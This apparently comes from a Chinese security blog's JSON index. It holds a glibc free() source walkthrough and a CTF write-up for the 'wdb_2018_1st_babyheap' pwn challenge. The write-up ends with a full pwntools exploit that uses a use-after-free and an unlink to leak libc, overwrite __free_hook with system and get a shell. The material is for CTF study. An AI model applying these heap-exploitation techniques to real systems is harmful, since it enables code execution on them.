&quot;free(): invalid pointer&quot;;    errout:      if (!have_lock &amp;&amp; locked)        (void) mutex_unlock (&amp;av-&gt;mutex);      malloc_printerr (check_action, errstr, chunk2mem (p), av);      return;    &#125;  /* We know that each chunk is at least MINSIZE bytes in size or a     multiple of MALLOC_ALIGNMENT.  */  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))    &#123;      errstr = &quot;free(): invalid size&quot;;      goto errout;    &#125;  check_inuse_chunk(av, p);  /*    If eligible, place chunk on a fastbin so it can be found    and used quickly in malloc.  */  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS      /*\tIf TRIM_FASTBINS set, don&#x27;t place chunks\tbordering top into fastbins      */      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif      ) &#123;    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)\t|| __builtin_expect (chunksize (chunk_at_offset (p, size))\t\t\t     &gt;= av-&gt;system_mem, 0))      &#123;\t/* We might not have a lock at this point and concurrent modifications\t   of system_mem might have let to a false positive.  Redo the test\t   after getting the lock.  */\tif (have_lock\t    || (&#123; assert (locked == 0);\t\t  mutex_lock(&amp;av-&gt;mutex);\t\t  locked = 1;\t\t  chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ\t\t    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;\t      &#125;))\t  &#123;\t    errstr = &quot;free(): invalid next size (fast)&quot;;\t    goto errout;\t  &#125;\tif (! have_lock)\t  &#123;\t    (void)mutex_unlock(&amp;av-&gt;mutex);\t    locked = 0;\t  &#125;      &#125;    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);    set_fastchunks(av);    unsigned int idx = fastbin_index(size);    fb = &amp;fastbin (av, idx);    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */    mchunkptr old = *fb, old2;    unsigned int old_idx = ~0u;    do      &#123;\t/* Check that the top of the bin is not the record we are going to add\t   (i.e., double free).  */\tif (__builtin_expect (old == p, 0))\t  &#123;\t    errstr = &quot;double free or corruption (fasttop)&quot;;\t    goto errout;\t  &#125;\t/* Check that size of fastbin chunk at the top is the same as\t   size of the chunk that we are adding.  We can dereference OLD\t   only if we have the lock, otherwise it might have already been\t   deallocated.  See use of OLD_IDX below for the actual check.  */\tif (have_lock &amp;&amp; old != NULL)\t  old_idx = fastbin_index(chunksize(old));\tp-&gt;fd = old2 = old;      &#125;    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))      &#123;\terrstr = &quot;invalid fastbin entry (free)&quot;;\tgoto errout;      &#125;  &#125;  /*    Consolidate other non-mmapped chunks as they arrive.  */  else if (!chunk_is_mmapped(p)) &#123;    if (! have_lock) &#123;      (void)mutex_lock(&amp;av-&gt;mutex);      locked = 1;    &#125;    nextchunk = chunk_at_offset(p, size);    /* Lightweight tests: check whether the block is already the       top block.  */    if (__glibc_unlikely (p == av-&gt;top))      &#123;\terrstr = &quot;double free or corruption (top)&quot;;\tgoto errout;      &#125;    /* Or whether the next chunk is beyond the boundaries of the arena.  */    if (__builtin_expect (contiguous (av)\t\t\t  &amp;&amp; (char *) nextchunk\t\t\t  &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))      &#123;\terrstr = &quot;double free or corruption (out)&quot;;\tgoto errout;      &#125;    /* Or whether the block is actually not marked used.  */    if (__glibc_unlikely (!prev_inuse(nextchunk)))      &#123;\terrstr = &quot;double free or corruption (!prev)&quot;;\tgoto errout;      &#125;    nextsize = chunksize(nextchunk);    if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0)\t|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))      &#123;\terrstr = &quot;free(): invalid next size (normal)&quot;;\tgoto errout;      &#125;    free_pert urb (chunk2mem(p), size - 2 * SIZE_SZ);    /* consolidate backward */    if (!prev_inuse(p)) &#123;      prevsize = p-&gt;prev_size;      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);    &#125;    if (nextchunk != av-&gt;top) &#123;      /* get and clear inuse bit */      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);      /* consolidate forward */      if (!nextinuse) &#123;\tunlink(av, nextchunk, bck, fwd);\tsize += nextsize;      &#125; else\tclear_inuse_bit_at_offset(nextchunk, 0);      /*\tPlace the chunk in unsorted chunk list. Chunks are\tnot placed into regular bins until after they have\tbeen given one chance to be used in malloc.      */      bck = unsorted_chunks(av);      fwd = bck-&gt;fd;      if (__glibc_unlikely (fwd-&gt;bk != bck))\t&#123;\t  errstr = &quot;free(): corrupted unsorted chunks&quot;;\t  goto errout;\t&#125;      p-&gt;fd = fwd;      p-&gt;bk = bck;      if (!in_smallbin_range(size))\t&#123;\t  p-&gt;fd_nextsize = NULL;\t  p-&gt;bk_nextsize = NULL;\t&#125;      bck-&gt;fd = p;      fwd-&gt;bk = p;      set_head(p, size | PREV_INUSE);      set_foot(p, size);      check_free_chunk(av, p);    &#125;    /*      If the chunk borders the current high end of memory,      consolidate into top    */    else &#123;      size += nextsize;      set_head(p, size | PREV_INUSE);      av-&gt;top = p;      check_chunk(av, p);    &#125;    /*      If freeing a large space, consolidate possibly-surrounding      chunks. Then, if the total unused topmost memory exceeds trim      threshold, ask malloc_trim to reduce top.      Unless max_fast is 0, we don&#x27;t know if there are fastbins      bordering top, so we cannot tell for sure whether threshold      has been reached unless fastbins are consolidated.  But we      don&#x27;t want to consolidate on each free.  As a compromise,      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD      is reached.    */    if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;      if (have_fastchunks(av))\tmalloc_consolidate(av);      if (av == &amp;main_arena) &#123;#ifndef MORECORE_CANNOT_TRIM\tif ((unsigned long)(chunksize(av-&gt;top)) &gt;=\t    (unsigned long)(mp_.trim_threshold))\t  systrim(mp_.top_pad, av);#endif      &#125; else &#123;\t/* Always try heap_trim(), even if the top chunk is not\t   large, because the corresponding heap might go away.  */\theap_info *heap = heap_for_ptr(top(av));\tassert(heap-&gt;ar_ptr == av);\theap_trim(heap, mp_.top_pad);      &#125;    &#125;    if (! have_lock) &#123;      assert (locked);      (void)mutex_unlock(&amp;av-&gt;mutex);    &#125;  &#125;  /*    If the chunk was allocated via mmap, release via munmap().  */  else &#123;    munmap_chunk (p);  &#125;&#125;\n\n首先是一系列地址检查\nsize = chunksize (p);/* Little security check which won&#x27;t hurt performance: the   allocator never wrapps around at the end of the address space.   Therefore we can exclude some size values which might appear   here by accident or by &quot;design&quot; from some intruder.  */if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)    || __builtin_expect (misaligned_chunk (p), 0))  &#123;    errstr = &quot;free(): invalid pointer&quot;;  errout:    if (!have_lock &amp;&amp; locked)      (void) mutex_unlock (&amp;av-&gt;mutex);    malloc_printerr (check_action, errstr, chunk2mem (p), av);    return;  &#125;/* We know that each chunk is at least MINSIZE bytes in size or a   multiple of MALLOC_ALIGNMENT.  */if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))  &#123;    errstr = &quot;free(): invalid size&quot;;    goto errout;  &#125;check_inuse_chunk(av, p);\n\n第一个判断内容为检测输入的地址是否溢出，检测方法是将地址和-size类型转化为无符号数，去比较大小。我们知道绝对值比较小的负数会变为很大的无符号数。由此来判断输入的地址是否溢出。之后去检查地址是否符合对齐原则。这里会抛出报错。\n &quot;free(): invalid pointer&quot;\n\n第二个判断判断的内容为size是否小于MINSIZE即堆块大小不能过小，之后去检测堆块大小是否对齐。\n//aligned_OK是一个宏#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)//这里MALLOC_ALIGN_MASK的值如下#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ)#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)\n\n之后我们转入fastbin部分\nfastbin/*    If eligible, place chunk on a fastbin so it can be found    and used quickly in malloc.  */  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS      /*\tIf TRIM_FASTBINS set, don&#x27;t place chunks\tbordering top into fastbins      */      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif      ) &#123;    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)\t|| __builtin_expect (chunksize (chunk_at_offset (p, size))\t\t\t     &gt;= av-&gt;system_mem, 0))      &#123;\t/* We might not have a lock at this point and concurrent modifications\t   of system_mem might have let to a false positive.  Redo the test\t   after getting the lock.  */\tif (have_lock\t    || (&#123; assert (locked == 0);\t\t  mutex_lock(&amp;av-&gt;mutex);\t\t  locked = 1;\t\t  chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ\t\t    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;\t      &#125;))\t  &#123;\t    errstr = &quot;free(): invalid next size (fast)&quot;;\t    goto errout;\t  &#125;\tif (! have_lock)\t  &#123;\t    (void)mutex_unlock(&amp;av-&gt;mutex);\t    locked = 0;\t  &#125;      &#125;    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);    set_fastchunks(av);    unsigned int idx = fastbin_index(size);    fb = &amp;fastbin (av, idx);    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */    mchunkptr old = *fb, old2;    unsigned int old_idx = ~0u;    do      &#123;\t/* Check that the top of the bin is not the record we are going to add\t   (i.e., double free).  */\tif (__builtin_expect (old == p, 0))\t  &#123;\t    errstr = &quot;double free or corruption (fasttop)&quot;;\t    goto errout;\t  &#125;\t/* Check that size of fastbin chunk at the top is the same as\t   size of the chunk that we are adding.  We can dereference OLD\t   only if we have the lock, otherwise it might have already been\t   deallocated.  See use of OLD_IDX below for the actual check.  */\tif (have_lock &amp;&amp; old != NULL)\t  old_idx = fastbin_index(chunksize(old));\tp-&gt;fd = old2 = old;      &#125;    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))      &#123;\terrstr = &quot;invalid fastbin entry (free)&quot;;\tgoto errout;      &#125;  &#125;  /*    Consolidate other non-mmapped chunks as they arrive.  */  else if (!chunk_is_mmapped(p)) &#123;    if (! have_lock) &#123;      (void)mutex_lock(&amp;av-&gt;mutex);      locked = 1;    &#125;          nextchunk = chunk_at_offset(p, size);    /* Lightweight tests: check whether the block is already the       top block.  */    if (__glibc_unlikely (p == av-&gt;top))      &#123;\terrstr = &quot;double free or corruption (top)&quot;;\tgoto errout;      &#125;    /* Or whether the next chunk is beyond the boundaries of the arena.  */    if (__builtin_expect (contiguous (av)\t\t\t  &amp;&amp; (char *) nextchunk\t\t\t  &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))      &#123;\terrstr = &quot;double free or corruption (out)&quot;;\tgoto errout;      &#125;    /* Or whether the block is actually not marked used.  */    if (__glibc_unlikely (!prev_inuse(nextchunk)))      &#123;\terrstr = &quot;double free or corruption (!prev)&quot;;\tgoto errout;      &#125;    nextsize = chunksize(nextchunk);    if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0)\t|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))      &#123;\terrstr = &quot;free(): invalid next size (normal)&quot;;\tgoto errout;      &#125;    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);    /* consolidate backward */    if (!prev_inuse(p)) &#123;      prevsize = p-&gt;prev_size;      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);    &#125;    if (nextchunk != av-&gt;top) &#123;      /* get and clear inuse bit */      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);      /* consolidate forward */      if (!nextinuse) &#123;\tunlink(av, nextchunk, bck, fwd);\tsize += nextsize;      &#125; else\tclear_inuse_bit_at_offset(nextchunk, 0);\n\n进入条件  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS      /*\tIf TRIM_FASTBINS set, don&#x27;t place chunks\tbordering top into fastbins      */      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif      ) &#123;\n\n首先需要释放堆块大小小于fastbin允许的最大大小，如果开启了TRIM_FASTBINS还需要要求释放堆块的下一个堆块不能是topchunk,这里应该是用于合并和topchunk相邻的堆块。\n一系列检查if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)\t|| __builtin_expect (chunksize (chunk_at_offset (p, size))\t\t\t     &gt;= av-&gt;system_mem, 0))\n\n先检查下一个堆块的大小是否小于所允许的最小chunk大小或者大于arena中的系统内存，是则直接错误。\n/* We might not have a lock at this point and concurrent modifications   of system_mem might have let to a false positive.  Redo the test   after getting the lock.  */if (have_lock    || (&#123; assert (locked == 0);\t  mutex_lock(&amp;av-&gt;mutex);\t  locked = 1;\t  chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ\t    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;      &#125;))  &#123;    errstr = &quot;free(): invalid next size (fast)&quot;;    goto errout;  &#125;if (! have_lock)  &#123;    (void)mutex_unlock(&amp;av-&gt;mutex);    locked = 0;  &#125;     &#125;\n\n这段涉及了线程相关的检查，先暂且跳过。\nfree_perturb (chunk2mem(p), size - 2 * SIZE_SZ);\n\n这个函数的作用是污染已经释放的内存空间，它的内部实际是一个memset,会将你释放的堆块的数据填满0x55。\nset_fastchunks(av);    unsigned int idx = fastbin_index(size);    fb = &amp;fastbin (av, idx);\n\n根据堆块大小获取下标和fastbin的头。\n/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */    mchunkptr old = *fb, old2;    unsigned int old_idx = ~0u;    do      &#123;\t/* Check that the top of the bin is not the record we are going to add\t   (i.e., double free).  */\tif (__builtin_expect (old == p, 0))\t  &#123;\t    errstr = &quot;double free or corruption (fasttop)&quot;;\t    goto errout;\t  &#125;\t/* Check that size of fastbin chunk at the top is the same as\t   size of the chunk that we are adding.  We can dereference OLD\t   only if we have the lock, otherwise it might have already been\t   deallocated.  See use of OLD_IDX below for the actual check.  */\tif (have_lock &amp;&amp; old != NULL)\t  old_idx = fastbin_index(chunksize(old));\tp-&gt;fd = old2 = old;      &#125;    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);\n\n先检查了fast的堆块头是否与我们释放的堆块p相同，避免重复释放。将p-&gt;fd设置为旧的堆块头。持续尝试将fb的值更新为p。这个do-while的作用我认为是针对多线程的一个处理。\nif (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))      &#123;\terrstr = &quot;invalid fastbin entry (free)&quot;;\tgoto errout;\n\n这部分也是针对多线程的一个处理。\n   nextchunk = chunk_at_offset(p, size);   /* Lightweight tests: check whether the block is already the      top block.  */   if (__glibc_unlikely (p == av-&gt;top))     &#123;errstr = &quot;double free or corruption (top)&quot;;goto errout;     &#125;   /* Or whether the next chunk is beyond the boundaries of the arena.  */   if (__builtin_expect (contiguous (av)\t\t  &amp;&amp; (char *) nextchunk\t\t  &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))     &#123;errstr = &quot;double free or corruption (out)&quot;;goto errout;     &#125;   /* Or whether the block is actually not marked used.  */   if (__glibc_unlikely (!prev_inuse(nextchunk)))     &#123;errstr = &quot;double free or corruption (!prev)&quot;;goto errout;     &#125;   nextsize = chunksize(nextchunk);   if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0)|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))     &#123;errstr = &quot;free(): invalid next size (normal)&quot;;goto errout;     &#125;   free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);\n\n上述内容为针对double free的一系列判断。\n这里检查了四件事：\n1，free的堆块是不是fastbin的头堆块(即最后一个放入fastbin的堆块)\n2，free的堆块是不是arena中的top chunk。\n3，free的堆块的nextchunk(这里的nextchunk指物理相邻的chunk)是否超过了topchunk的边界。\n​\t这里使用了nextchunk这一变量来源如下:\nnextchunk = chunk_at_offset(p, size);\n\n顾名思义是根据堆块大小偏移获取nextchunk的地址，如果nextchunk的地址超过了topchunk则报错。\n4，最后检查nextchunk中是否将prev_inuse置1。\n由于上述条件的存在，我们可以得出一些堆利用中应该注意的点。\n1，我们不能连续释放同一个堆块2，修改chunk大小时应该注意不应该让这个大小超出topchunk范围3，释放的堆块的nextchunk必须将prev_inuse置1\n\n向前向后合并/* consolidate backward */    if (!prev_inuse(p)) &#123;      prevsize = p-&gt;prev_size;      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);    &#125;    if (nextchunk != av-&gt;top) &#123;      /* get and clear inuse bit */      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);      /* consolidate forward */      if (!nextinuse) &#123;\tunlink(av, nextchunk, bck, fwd);\tsize += nextsize;      &#125; else\tclear_inuse_bit_at_offset(nextchunk, 0);\n\n向后合并的逻辑如下:\n1，如果堆块p的前一个堆块是空闲堆块则进入向后合并流程2，\n\n向前合并逻辑如下：\n1，如果下nextchunk是空闲堆块则进入向前合并流程2,将当前堆块的大小加上nextchunk的大小3，利用unlink将nextchunk从bin中解链\n\nunsorted bin /*Place the chunk in unsorted chunk list. Chunks arenot placed into regular bins until after they havebeen given one chance to be used in malloc.     */     bck = unsorted_chunks(av);     fwd = bck-&gt;fd;     if (__glibc_unlikely (fwd-&gt;bk != bck))&#123;  errstr = &quot;free(): corrupted unsorted chunks&quot;;  goto errout;&#125;     p-&gt;fd = fwd;     p-&gt;bk = bck;     if (!in_smallbin_range(size))&#123;  p-&gt;fd_nextsize = NULL;  p-&gt;bk_nextsize = NULL;&#125;     bck-&gt;fd = p;     fwd-&gt;bk = p;     set_head(p, size | PREV_INUSE);     set_foot(p, size);     check_free_chunk(av, p);   &#125;\n\n检查unsortedbin的结构是否异常，即(bck-&gt;fd)-&gt;bk = bck。\n之后就是将释放的堆块链入unsortedbin，如果堆块不在smallbin的范围中则将它的fd_nextsize与bk_nextsize置零。\nset_head(p, size | PREV_INUSE);set_foot(p, size);\n\n这两个宏作用为设定p-&gt;size为size，并将PREV_INUSE置1。之后将nextchunk的prev_size也设置为size。\ncheck_free_chunk(av, p);//实际为函数do_check_free_chunk的一个别名，进行了对堆块的一系列检查。\n\n合并与修剪内存    /*      If freeing a large space, consolidate possibly-surrounding      chunks. Then, if the total unused topmost memory exceeds trim      threshold, ask malloc_trim to reduce top.      Unless max_fast is 0, we don&#x27;t know if there are fastbins      bordering top, so we cannot tell for sure whether threshold      has been reached unless fastbins are consolidated.  But we      don&#x27;t want to consolidate on each free.  As a compromise,      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD      is reached.    */    if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;      if (have_fastchunks(av))\tmalloc_consolidate(av);      if (av == &amp;main_arena) &#123;#ifndef MORECORE_CANNOT_TRIM\tif ((unsigned long)(chunksize(av-&gt;top)) &gt;=\t    (unsigned long)(mp_.trim_threshold))\t  systrim(mp_.top_pad, av);#endif      &#125; else &#123;\t/* Always try heap_trim(), even if the top chunk is not\t   large, because the corresponding heap might go away.  */\theap_info *heap = heap_for_ptr(top(av));\tassert(heap-&gt;ar_ptr == av);\theap_trim(heap, mp_.top_pad);      &#125;    &#125;    if (! have_lock) &#123;      assert (locked);      (void)mutex_unlock(&amp;av-&gt;mutex);    &#125;  &#125;  /*    If the chunk was allocated via mmap, release via munmap().  */  else &#123;    munmap_chunk (p);  &#125;&#125;\n\n总结由上述内容可知，free函数调用时主要处理了fastbin和unsortedbin的部分。从这里我们可以理解一个堆块释放的流程。\n一个堆块符合条件时会被放入fastbin，否则放入unsortedbin。而smallbin与largebin都是后续申请内存时从unsortedbin中切出去形成的。\n","categories":["源码分析"],"tags":["源码分析"]},{"title":"wdb_2018_1st_babyheap_WP","url":"/2024/09/03/wdb-2018-1st-babyheap-WP/","content":"wdb_2018_1st_babyheap WPchecksecArch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x3ff000)\n\nFull RELRO不能直接写got表。\n静态分析int sub_4008E3()&#123;  puts(&quot;1.alloc&quot;);  puts(&quot;2.edit&quot;);  puts(&quot;3.show&quot;);  puts(&quot;4.free&quot;);  puts(&quot;5.exit&quot;);  return printf(&quot;Choice:&quot;);&#125;\n\n程序功能如上\nunsigned __int64 sub_400B54()&#123;  unsigned int v1; // [rsp+Ch] [rbp-24h]  char s[24]; // [rsp+10h] [rbp-20h] BYREF  unsigned __int64 v3; // [rsp+28h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;Index:&quot;);  memset(s, 0, 0x10uLL);  read(0, s, 0xFuLL);  v1 = atoi(s);  if ( v1 &lt;= 9 &amp;&amp; (&amp;ptr)[v1] )  &#123;    free((&amp;ptr)[v1]);    puts(&quot;Done!&quot;);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\n漏洞点在free操作中，存在UAF漏洞。\nunsigned __int64 sub_4009A0()&#123;  unsigned int v1; // [rsp+Ch] [rbp-24h]  char s[24]; // [rsp+10h] [rbp-20h] BYREF  unsigned __int64 v3; // [rsp+28h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;Index:&quot;);  memset(s, 0, 0x10uLL);  read(0, s, 0xFuLL);  v1 = atoi(s);  if ( v1 &lt;= 9 &amp;&amp; !(&amp;ptr)[v1] )  &#123;    (&amp;ptr)[v1] = (char *)malloc(0x20uLL);    printf(&quot;Content:&quot;);    sub_40092B((__int64)(&amp;ptr)[v1], 0x20u);    puts(&quot;Done!&quot;);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\n允许申请最多十个堆块，大小固定为0x30。\nunsigned __int64 sub_400A79()&#123;  unsigned int v1; // [rsp+Ch] [rbp-24h]  char s[24]; // [rsp+10h] [rbp-20h] BYREF  unsigned __int64 v3; // [rsp+28h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;Index:&quot;);  memset(s, 0, 0x10uLL);  read(0, s, 0xFuLL);  v1 = atoi(s);  if ( v1 &lt;= 0x1F &amp;&amp; (&amp;ptr)[v1] &amp;&amp; dword_6020B0 != 3 )  &#123;    printf(&quot;Content:&quot;);    sub_40092B((&amp;ptr)[v1], 32LL);    ++dword_6020B0;    puts(&quot;Done!&quot;);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\nedit功能只能使用3次。\n解题思路由于got表不可写考虑向free_hook中写system。显然我们需要泄露libc地址，在堆中泄露libc最经典的思路是利用unsortedbin去泄露main_arena+88的地址。但这里我们申请堆块的大小被固定。必须通过其他方法获得unsoredbinchunk。\n这里我们利用uaf修改已经进入fastbin中的chunk，伪造一个chunk来修改其他chunk的大小，同时由于没有开启PIE，储存堆块地址的位置已知，可以进行unlink。\n具体操作首先我们先申请一系列堆块进行准备工作(其实这里不算时未卜先知，是写到后头发现长度不够才回头申请的堆块)。\n依次释放chunk1，chunk0，这时chunk0的fd位置储存着chunk1的地址。利用show泄露出堆的地址。\n\n我们需要构造一个fake chunk并将fakechunk地址写入chunk1的fd。这里我们用掉了一次edit机会。\n我们选择将fakechunk构造在chunk0的数据部分。我们申请3个堆块就可以依次申请出chunk0，chunk1，fakechunk。\n申请出chunk0，时要注意修改fakechunk的chunk头的size部分为0x31\n注意我们程序中申请堆块要求下标不重复，这时我们的下标对应的堆块应该是这个样子。\n\n之后我们释放chunk 5，再将其申请回来为chunk 8以修改fakechunk的大小为0x21。这里就要问了，既然这里要改成0x21，为什么刚才不直接改好呢。\n这是因为申请内存时有一个检查，会检查你申请的那个内存大小是否与所在的fastbin应有的大小相同，如果刚才改为0x21是过不去这个检查的。\n至于为什么修改为0x21是因为一会freechunk6进行unlink时会有检查大小。\n我们现在进入unlink部分\nunlinkunlink会出现在释放堆块时最后进行向后或向前合并时。它的作用是将进行合并的空闲chunk从所在的bin中解链。\n当我们将chunk6释放时，他会发现前面的chunk7是空闲的，进入向后合并流程，将chunk7进行解链。判断如下\n1，检查chunk6的presize是否与chunk7的size一致2，检查chunk7-&gt;fd -&gt;bk == chhunk7,chunk7-&gt;bk -&gt;fd ==chunk7\n\n我们的fake chunk的地址（即chunk0的数据段部分）存在了bss段上的ptr中。我们只要修改fakechunk的fd为ptr-0x18，bk为ptr-0x10，就能通过这个检查。\n而且经过解链，chunk7-&gt;fd -&gt;bk &#x3D; chunk7 -&gt;bk，chunk7-&gt;bk-&gt;fd &#x3D; chunk7-&gt;fd。结果就是ptr的位置被改写成为了ptr-0x18。这就是unlink的一个流程。\n之后我们可以通过操作chunk0去修改ptr，从而获得任意地址读写的能力。\n为了unlink我们释放chunk6，这里就是为什么要多申请几个堆块，因为chunk6的size被我们改成了0xa0,在free时他会检查nextchunk的的prev_inuse是否为1，而且这个nextchunk是通过根据大小偏移得到的，所以我们只能多申请堆块去修改对应位置。\n最终我们的堆块情况应该如下。\n\n这时因为free和unlink，fakechunk被放入了unsortedbin，我们打印fakechunk即可泄露libc。我们之后只需要计算出free_hook与system的地址，先edit0将ptr改为free _hook，再次edit即可完成向free_hook中写入system。\n最后我们再free chunk6，就能执行system(“&#x2F;bin&#x2F;sh)。\nexpfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r       = lambda num                :io.recv(num)rl      = lambda                    :io.recvline()ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b&#x27;\\x00&#x27;))uu64    = lambda data               :u64(data.ljust(8,b&#x27;\\x00&#x27;))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success(&#x27;\\033[1;31;40m%s --&gt; 0x%x \\033[0m&#x27; % (s, eval(s)))context.arch      = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;binary = &#x27;./pwn&#x27;libelf = &#x27;./libc-2.23.so&#x27;if (binary!=&#x27;&#x27;): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=&#x27;&#x27;): libc = ELF(libelf)io = process(&quot;./pwn&quot;)#io = remote(&quot;node5.buuoj.cn&quot;,27661)def a(idx,content = b&quot;&quot;):\tsla(b&quot;Choice:&quot;,b&quot;1&quot;)\tsla(b&quot;Index:&quot;,str(idx).encode())\tsa(b&quot;Content:&quot;,content.ljust(32,b&quot;a&quot;))\tdef e(idx,content = b&quot;&quot;):\tsla(b&quot;Choice:&quot;,b&quot;2&quot;)\tsla(b&quot;Index:&quot;,str(idx).encode())\tsa(b&quot;Content:&quot;,content)\tdef s(idx):\tsla(b&quot;Choice:&quot;,b&quot;3&quot;)\tsla(b&quot;Index:&quot;,str(idx).encode())\tdef f(idx):\tsla(b&quot;Choice:&quot;,b&quot;4&quot;)\tsla(b&quot;Index:&quot;,str(idx).encode())\tlist = 0x602060\t\t\t#gdb.attach(io)a(0)a(1)a(2)a(3)a(4,p64(0)+p64(0x21))f(1)f(0)s(0)heapaddr = u64(ru(b&quot;\\n&quot;).ljust(8,b&quot;\\x00&quot;))ls(&quot;heap:&quot;+hex(heapaddr))e(1,p64(heapaddr-0x20)+b&quot;a&quot;*0x18)a(5,b&quot;a&quot;*8+p64(0x31)+p64(0)+p64(0))a(6,b&quot;/bin/sh\\x00&quot;)a(7,p64(0)+p64(0)+p64(0x20)+p64(0xa0))f(5)a(8,b&quot;a&quot;*8+p64(0x21)+p64(list-0x18)+p64(list-0x10))f(1)s(7)libc_base = u64(ru(b&quot;\\n&quot;).ljust(8,b&quot;\\x00&quot;)) - 0x3C4B20 - 88ls(&quot;libc: &quot;+ hex(libc_base))free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]e(0,p64(0)*3+p64(free_hook))e(0,p64(libc_base+libc.sym[&quot;system&quot;])+p64(0)*3)f(6)itr()\n\n总结警惕sendline陷阱，如果不影响的话建议根据允许输入的长度调整输入数据，尤其不要干输入0x20字节，算上”\\n”其实是0x21字节这种事。\n​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \n","categories":["pwn WriteUp"],"tags":["heap","unlink"]}]